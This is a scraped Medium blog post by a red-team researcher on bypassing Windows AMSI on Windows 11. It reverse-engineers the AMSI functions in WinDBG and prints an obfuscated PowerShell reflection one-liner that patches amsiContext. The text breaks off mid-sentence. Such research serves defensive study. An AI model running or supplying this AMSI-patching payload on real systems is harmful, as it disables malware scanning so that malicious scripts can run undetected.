on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"isLoggedIn":false,"collectionByDomainOrSlug({\"domainOrSlug\":\"gustavshen.medium.com\"})":null,"postResult({\"id\":\"75d231b2cac6\"})":{"__ref":"Post:75d231b2cac6"}},"LinkedAccounts:39cded15042e":{"__typename":"LinkedAccounts","mastodon":null,"id":"39cded15042e"},"UserViewerEdge:userId:39cded15042e-viewerId:lo_c24ca5492d32":{"__typename":"UserViewerEdge","id":"userId:39cded15042e-viewerId:lo_c24ca5492d32","isFollowing":false,"isUser":false,"isMuting":false},"NewsletterV3:8e26c8f7717e":{"__typename":"NewsletterV3","id":"8e26c8f7717e","type":"NEWSLETTER_TYPE_AUTHOR","slug":"39cded15042e","name":"39cded15042e","collection":null,"user":{"__ref":"User:39cded15042e"}},"User:39cded15042e":{"__typename":"User","id":"39cded15042e","name":"Gustav Shen","username":"gustavshen","newsletterV3":{"__ref":"NewsletterV3:8e26c8f7717e"},"linkedAccounts":{"__ref":"LinkedAccounts:39cded15042e"},"isSuspended":false,"imageId":"1*QVBOkkcMPzE3HYxh1TH2Sg.jpeg","mediumMemberAt":0,"verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":221},"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"gustavshen.medium.com"}},"hasSubdomain":true,"bio":"Red Team @ World Bank","isPartnerProgramEnrolled":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:39cded15042e-viewerId:lo_c24ca5492d32"},"viewerIsUser":false,"postSubscribeMembershipUpsellShownAt":0,"allowNotes":true,"membership":null,"twitterScreenName":""},"Paragraph:4780fc344bbe_0":{"__typename":"Paragraph","id":"4780fc344bbe_0","name":"74c3","type":"H3","href":null,"layout":null,"metadata":null,"text":"Bypass AMSI on Windows 11","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_1":{"__typename":"Paragraph","id":"4780fc344bbe_1","name":"5e88","type":"H3","href":null,"layout":null,"metadata":null,"text":"Motivation","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_2":{"__typename":"Paragraph","id":"4780fc344bbe_2","name":"a5d6","type":"P","href":null,"layout":null,"metadata":null,"text":"In this article, I want to break down AMSI (Anti-Malware Scan Interface) and its bypass technique on Windows 11. AMSI bypass is not a new topic, and compared with bypassing EDR, AMSI bypass is much easier, but I found that one bypass approach taught in OSEP does not work on Windows 11. It interests me, as I want to know what has changed under the hood on Windows 11.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*5P_PNHqYmPYGuhMk.png":{"__typename":"ImageMetadata","id":"0*5P_PNHqYmPYGuhMk.png","originalHeight":453,"originalWidth":1457,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_3":{"__typename":"Paragraph","id":"4780fc344bbe_3","name":"0779","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*5P_PNHqYmPYGuhMk.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_4":{"__typename":"Paragraph","id":"4780fc344bbe_4","name":"64d8","type":"P","href":null,"layout":null,"metadata":null,"text":"As I am learning OSED, I also want to apply the reverse engineering skill I learned to do some personal research. Okay, let’s start.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_5":{"__typename":"Paragraph","id":"4780fc344bbe_5","name":"ad33","type":"H3","href":null,"layout":null,"metadata":null,"text":"Background","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_6":{"__typename":"Paragraph","id":"4780fc344bbe_6","name":"427e","type":"P","href":null,"layout":null,"metadata":null,"text":"On Windows hosts, we can get a shell or C2 session by executing an exe file. Additionally, we can achieve the same goal with some script languages, such as using PowerShell IEX download cradle to run the script in memory without leaving files on the disk. Compared to detecting payloads on the disk, it is harder for traditional anti-virus products to detect such delivery, while AMSI provides a scanning interface to capture various script languages such as PowerShell, JScript, VBA, or C# code at run time to address the gap.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":162,"end":177,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":459,"end":469,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":471,"end":478,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":480,"end":483,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":488,"end":496,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_7":{"__typename":"Paragraph","id":"4780fc344bbe_7","name":"a1df","type":"P","href":null,"layout":null,"metadata":null,"text":"Amsi stands for “Anti-malware Scan Interface“; it targets malicious script-based malware. The following figure illustrates the process of how AMSI works in high level.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":17,"end":44,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":68,"end":88,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*cV89qZMVc1nrX6MU.png":{"__typename":"ImageMetadata","id":"0*cV89qZMVc1nrX6MU.png","originalHeight":321,"originalWidth":727,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_8":{"__typename":"Paragraph","id":"4780fc344bbe_8","name":"b463","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*cV89qZMVc1nrX6MU.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_9":{"__typename":"Paragraph","id":"4780fc344bbe_9","name":"7115","type":"P","href":null,"layout":null,"metadata":null,"text":"amsi.dll is loaded to each powershell.exe process, providing export functions such as AmsiInitialize, AmsiOpenSession, AmsiScanbuffer, etc. The content of the script is passed into AmsiScanBuffer as an argument. Before the execution, the script will be determined if it is malicious.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":8,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":27,"end":41,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":86,"end":100,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":102,"end":118,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":119,"end":133,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":181,"end":195,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_10":{"__typename":"Paragraph","id":"4780fc344bbe_10","name":"956a","type":"P","href":null,"layout":null,"metadata":null,"text":"Use WinDBG to run powershell.exe; when the process is attached, we can see now amsi.dll is not loaded already.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*9_HXIzK2ZbVyQRzi.png":{"__typename":"ImageMetadata","id":"0*9_HXIzK2ZbVyQRzi.png","originalHeight":101,"originalWidth":709,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_11":{"__typename":"Paragraph","id":"4780fc344bbe_11","name":"2dde","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*9_HXIzK2ZbVyQRzi.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_12":{"__typename":"Paragraph","id":"4780fc344bbe_12","name":"e858","type":"P","href":null,"layout":null,"metadata":null,"text":"Set unresolved breakpoints for AmsiInitialize, AmsiOpenSession, and AmsiScanBuffer, continue the execution. Immediately, we hit the breakpoint at the entry of function AmsiInitialize. Now amsi.dll is loaded, and the function AmsiInitialize is called.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":31,"end":45,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":47,"end":62,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":68,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*wxs9luiAkSIne5nz.png":{"__typename":"ImageMetadata","id":"0*wxs9luiAkSIne5nz.png","originalHeight":84,"originalWidth":660,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_13":{"__typename":"Paragraph","id":"4780fc344bbe_13","name":"0c8b","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*wxs9luiAkSIne5nz.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*WtW3XzIaqT6TpVcG.png":{"__typename":"ImageMetadata","id":"0*WtW3XzIaqT6TpVcG.png","originalHeight":127,"originalWidth":1259,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_14":{"__typename":"Paragraph","id":"4780fc344bbe_14","name":"3118","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*WtW3XzIaqT6TpVcG.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_15":{"__typename":"Paragraph","id":"4780fc344bbe_15","name":"c90c","type":"P","href":null,"layout":null,"metadata":null,"text":"At this time, we have not executed any script, and the powershell banner is not even loaded.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*gdrOZezkU7pw3ifM.png":{"__typename":"ImageMetadata","id":"0*gdrOZezkU7pw3ifM.png","originalHeight":166,"originalWidth":685,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_16":{"__typename":"Paragraph","id":"4780fc344bbe_16","name":"4b1a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*gdrOZezkU7pw3ifM.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_17":{"__typename":"Paragraph","id":"4780fc344bbe_17","name":"42f1","type":"P","href":null,"layout":null,"metadata":null,"text":"Continue the execution, we hit breakpoints at the entry of functions AmsiOpenSession and AmsiScanBuffer, respectively.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":69,"end":85,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":89,"end":105,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*AzR0xp_sVnqTTCpy.png":{"__typename":"ImageMetadata","id":"0*AzR0xp_sVnqTTCpy.png","originalHeight":164,"originalWidth":696,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_18":{"__typename":"Paragraph","id":"4780fc344bbe_18","name":"7767","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*AzR0xp_sVnqTTCpy.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_19":{"__typename":"Paragraph","id":"4780fc344bbe_19","name":"0047","type":"P","href":null,"layout":null,"metadata":null,"text":"Now, the banner is loaded, and we can supply the script.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*zslt0tsd2GjCs2QC.png":{"__typename":"ImageMetadata","id":"0*zslt0tsd2GjCs2QC.png","originalHeight":208,"originalWidth":1106,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_20":{"__typename":"Paragraph","id":"4780fc344bbe_20","name":"6f5d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*zslt0tsd2GjCs2QC.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_21":{"__typename":"Paragraph","id":"4780fc344bbe_21","name":"d425","type":"P","href":null,"layout":null,"metadata":null,"text":"In summary, though the process of loading AMSI may involve more steps and be more complex, we know AmsiInitialize is called first, then AmsiOpenSession, and AmsiScanBuffer.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_22":{"__typename":"Paragraph","id":"4780fc344bbe_22","name":"67e8","type":"P","href":null,"layout":null,"metadata":null,"text":"Let’s supply malicious content “invoke-mimikatz”, and inspect the calling of these functions.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":32,"end":48,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*IkCvULhtK5YV7Ij2.png":{"__typename":"ImageMetadata","id":"0*IkCvULhtK5YV7Ij2.png","originalHeight":189,"originalWidth":1092,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_23":{"__typename":"Paragraph","id":"4780fc344bbe_23","name":"7d6d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*IkCvULhtK5YV7Ij2.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_24":{"__typename":"Paragraph","id":"4780fc344bbe_24","name":"e4a8","type":"P","href":null,"layout":null,"metadata":null,"text":"When inspecting script content, AmsiInitialize is not called, but AmsiOpenSession and AmsiScanBuffer are still called in order. The calling order is not surprising, as the function names are self-explanatory.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*aDJQ9WmQDqOUPFZC.png":{"__typename":"ImageMetadata","id":"0*aDJQ9WmQDqOUPFZC.png","originalHeight":186,"originalWidth":1255,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_25":{"__typename":"Paragraph","id":"4780fc344bbe_25","name":"9ba6","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*aDJQ9WmQDqOUPFZC.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_26":{"__typename":"Paragraph","id":"4780fc344bbe_26","name":"ae67","type":"P","href":null,"layout":null,"metadata":null,"text":"Finally, the script content is regarded as malicious.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*rZJNV64TPPAzZ1Zc.png":{"__typename":"ImageMetadata","id":"0*rZJNV64TPPAzZ1Zc.png","originalHeight":189,"originalWidth":1082,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_27":{"__typename":"Paragraph","id":"4780fc344bbe_27","name":"cbeb","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*rZJNV64TPPAzZ1Zc.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_28":{"__typename":"Paragraph","id":"4780fc344bbe_28","name":"5e15","type":"P","href":null,"layout":null,"metadata":null,"text":"To understand the process better, let’s inspect these functions.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_29":{"__typename":"Paragraph","id":"4780fc344bbe_29","name":"c86a","type":"P","href":null,"layout":null,"metadata":null,"text":"Function AmsiInitialize has 2 arguments, after the execution, the argument amsiContext will be initialized. It is a handle of type HAMSICONTEXT that will be passed to all subsequent calls to the AMSI API.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":28,"end":29,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":75,"end":86,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":131,"end":143,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_30":{"__typename":"Paragraph","id":"4780fc344bbe_30","name":"8a3f","type":"PRE","href":null,"layout":null,"metadata":null,"text":"HRESULT AmsiInitialize(\n[in] LPCWSTR appName,\n[out] HAMSICONTEXT *amsiContext\n);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"cpp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_31":{"__typename":"Paragraph","id":"4780fc344bbe_31","name":"453e","type":"P","href":null,"layout":null,"metadata":null,"text":"Function AmsiOpenSession has 2 arguments, either. The 1st argument is amsiContext, which is initialized from the function AmsiInitialize. After the execution, amsiSession will be initialized. It is a handle of type HAMSISESSION that will be passed to all subsequent calls to the AMSI API within the session.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":159,"end":171,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":215,"end":228,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_32":{"__typename":"Paragraph","id":"4780fc344bbe_32","name":"0554","type":"PRE","href":null,"layout":null,"metadata":null,"text":"HRESULT AmsiOpenSession(\n[in] HAMSICONTEXT amsiContext,\n[out] HAMSISESSION *amsiSession\n);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"cpp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_33":{"__typename":"Paragraph","id":"4780fc344bbe_33","name":"903f","type":"P","href":null,"layout":null,"metadata":null,"text":"Function AmsiScanBuffer has 6 arguments, including previously initialized amsiContext and amsiSession. Other arguments include the script content, the length of the content, the content ID, and the scan result. The value of argument result will be set after the execution.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_34":{"__typename":"Paragraph","id":"4780fc344bbe_34","name":"02ca","type":"PRE","href":null,"layout":null,"metadata":null,"text":"HRESULT AmsiScanBuffer(\n[in] HAMSICONTEXT amsiContext,\n[in] PVOID buffer,\n[in] ULONG length,\n[in] LPCWSTR contentName,\n[in, optional] HAMSISESSION amsiSession,\n[out] AMSI_RESULT *result\n);","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"cpp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_35":{"__typename":"Paragraph","id":"4780fc344bbe_35","name":"8f82","type":"P","href":null,"layout":null,"metadata":null,"text":"According to the result value, scanned script could be considered malicious or clean. AMSI_RESULT_CLEAN is 1, AMSI_RESULT_DETECTED is 32767.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":86,"end":104,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":107,"end":108,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":110,"end":131,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":134,"end":140,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_36":{"__typename":"Paragraph","id":"4780fc344bbe_36","name":"f12e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"typedef enum AMSI_RESULT {\nAMSI_RESULT_CLEAN,\nAMSI_RESULT_NOT_DETECTED,\nAMSI_RESULT_BLOCKED_BY_ADMIN_START,\nAMSI_RESULT_BLOCKED_BY_ADMIN_END,\nAMSI_RESULT_DETECTED\n} ;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"cpp"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_37":{"__typename":"Paragraph","id":"4780fc344bbe_37","name":"f74c","type":"P","href":null,"layout":null,"metadata":null,"text":"Armed with background knowledge, let’s discuss how to bypass AMSI by attacking these functions.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_38":{"__typename":"Paragraph","id":"4780fc344bbe_38","name":"330b","type":"H3","href":null,"layout":null,"metadata":null,"text":"Attack AmsiOpenSession","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_39":{"__typename":"Paragraph","id":"4780fc344bbe_39","name":"4ae7","type":"P","href":null,"layout":null,"metadata":null,"text":"In OSEP, the bypass method is to patch the first DWORD pointed by amsiContext. The following screenshot is the graph view of AmsiOpenSession on Windows Server 2019. As we can see, the first DWORD is compared to “AMSI“.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":49,"end":54,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":144,"end":163,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":212,"end":216,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*zYCI0v1wQkrbhM2Y.png":{"__typename":"ImageMetadata","id":"0*zYCI0v1wQkrbhM2Y.png","originalHeight":731,"originalWidth":914,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_40":{"__typename":"Paragraph","id":"4780fc344bbe_40","name":"82d1","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*zYCI0v1wQkrbhM2Y.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_41":{"__typename":"Paragraph","id":"4780fc344bbe_41","name":"1d53","type":"P","href":null,"layout":null,"metadata":null,"text":"As long as the first DWORD is not equal to “AMSI”, the execution will jump to the following code block:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_42":{"__typename":"Paragraph","id":"4780fc344bbe_42","name":"e2d8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"loc_18000250B:\nmov eax, 80070057h\nretn\nAmsiOpenSession endp","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"makefile"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_43":{"__typename":"Paragraph","id":"4780fc344bbe_43","name":"ef85","type":"P","href":null,"layout":null,"metadata":null,"text":"EAX is set as 0x80070057, which is E_INVALIDARG error. The execution of AmsiOpenSession is unsuccessful, and so will all subsequent calls to the AMSI API.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":14,"end":24,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":35,"end":47,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*Zna9zB_GzPK8VnombAsvEg.png":{"__typename":"ImageMetadata","id":"1*Zna9zB_GzPK8VnombAsvEg.png","originalHeight":618,"originalWidth":928,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_44":{"__typename":"Paragraph","id":"4780fc344bbe_44","name":"785a","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*Zna9zB_GzPK8VnombAsvEg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_45":{"__typename":"Paragraph","id":"4780fc344bbe_45","name":"28a0","type":"P","href":null,"layout":null,"metadata":null,"text":"However, on Windows 11, the first DWORD is not checked anymore. Fortunately, there are still multiple ways to land that code block. The RDX, RCX, the 2nd QWORD, and the 3rd QWORD are compared to 0 respectively. If any of them equals 0, AmsiOpenSession will exit with error.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":136,"end":139,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":141,"end":144,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":150,"end":159,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":169,"end":179,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":195,"end":196,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":214,"end":217,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*PjC8Ba52FdDoX6Sd.png":{"__typename":"ImageMetadata","id":"0*PjC8Ba52FdDoX6Sd.png","originalHeight":735,"originalWidth":1099,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_46":{"__typename":"Paragraph","id":"4780fc344bbe_46","name":"b983","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*PjC8Ba52FdDoX6Sd.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_47":{"__typename":"Paragraph","id":"4780fc344bbe_47","name":"4126","type":"P","href":null,"layout":null,"metadata":null,"text":"The following one-liner payload leverages reflection, it can be used to patch the 1st DWORD to achieve AMSI bypass, now it does not work on Windows 11.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_48":{"__typename":"Paragraph","id":"4780fc344bbe_48","name":"716c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_49":{"__typename":"Paragraph","id":"4780fc344bbe_49","name":"ba01","type":"P","href":null,"layout":null,"metadata":null,"text":"The one-liner payload is obfuscated to avoid signature-based detection, let’s break it 